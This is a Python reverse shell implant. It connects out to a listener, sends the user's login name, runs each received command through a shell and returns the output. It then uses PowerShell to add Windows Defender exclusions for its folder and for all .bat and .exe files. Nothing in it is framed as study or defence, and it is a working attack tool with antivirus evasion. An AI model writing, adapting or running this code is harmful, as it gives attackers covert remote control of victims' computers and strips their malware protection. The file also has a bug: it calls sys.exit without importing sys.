import socket
import subprocess
import os
import time
import platform
login_name = os.getlogin()
folder_to_exclude = os.getcwd()
#add functionality to check for os arch
#add exclusion folder
def check_architecture():
    arch_bits, _ = platform.architecture()
    return arch_bits.startswith('64')

def add_exclusion(folder_path):
  
    folder_path = f'"{folder_path}"'

    command = f"Add-MpPreference -ExclusionPath {folder_path}"
    try:
        subprocess.run(["powershell", "-Command", command], check=True)
        print(f"Successfully added exclusion for folder: {folder_path}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add exclusion: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")


def reverse_shell(host='0.0.0.0', port=8989):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))
            print(f"Connected to {host}:{port}")
            client_socket.send(login_name.encode())
            break  # Exit the loop if connection is successful
        except (ConnectionRefusedError,BrokenPipeError):

            print(f"Connection refused. Retrying in 5 seconds...")
            time.sleep(5)  # Wait before retrying

    current_dir = os.getcwd()

    while True:
        try:
            command = client_socket.recv(4096).decode()
            if not command:
                break
            if command.lower() == 'exit':
                break
            elif command.startswith("cd"):
                try:
                    new_dir = command[3:].strip()
                    os.chdir(new_dir)
                    current_dir = os.getcwd()
                    response = f'Changed directory to {current_dir}'
                except FileNotFoundError:
                    response = "Directory not found"
                except Exception as e:
                    response = str(e)
            else:
                try:
                    response = subprocess.check_output(command, shell=True, cwd=current_dir, stderr=subprocess.STDOUT)
                    response = response.decode()  # Decode bytes to string
                except subprocess.CalledProcessError as e:
                    response = e.output.decode()  # Decode bytes to string
                except Exception as e:
                    response = str(e)

            client_socket.send(response.encode())

        except (ConnectionResetError, BrokenPipeError) as e:
            print(f"Connection lost: {e}")
            # break
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Unexpected error: {e}")
            # break

    client_socket.close()
    print("Connection closed.")

if __name__ == "__main__":
    if not check_architecture():
        print("Not 64-bit")
        sys.exit(1)
    
    print("64-bit.")

    reverse_shell()

    add_exclusion(folder_to_exclude)

    bat_exclusion = 'Add-MpPreference -ExclusionExtension .bat'

    subprocess.run(["powershell.exe", "-Command", bat_exclusion], check=False)

    exe_exclusion = 'Add-MpPreference -ExclusionExtension .exe'

    subprocess.run(["powershell.exe", "-Command", exe_exclusion], check=False)

    